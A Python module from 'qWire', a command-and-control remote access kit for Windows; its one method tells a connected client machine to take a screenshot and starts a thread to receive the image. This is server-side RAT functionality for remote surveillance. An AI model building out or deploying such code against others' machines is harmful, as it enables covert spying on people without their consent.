#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.2
# -------------------------------------------------------------
from ..networking.socket import ServerSocket
from ..networking.stream_socket import StreamingSocket
from ..client_handling.flags import ClientActionFlags
from ..threading.threads import MultiThreading

BUFFER = 4096

class Streaming:

    #Function will tell client to take a screenshot, and then create a thread to receive the photo
    def get_client_screenshot(self, encryption_key,client):
        flag = f'{ClientActionFlags().screenshot}{ClientActionFlags().seperator} '        #Action flag
        ServerSocket().send_data_to_client(client,encryption_key,flag)                           #Tell client to take photo
        MultiThreading().create_background_thread(StreamingSocket().receive_screenshot()) #Create thread to receive photo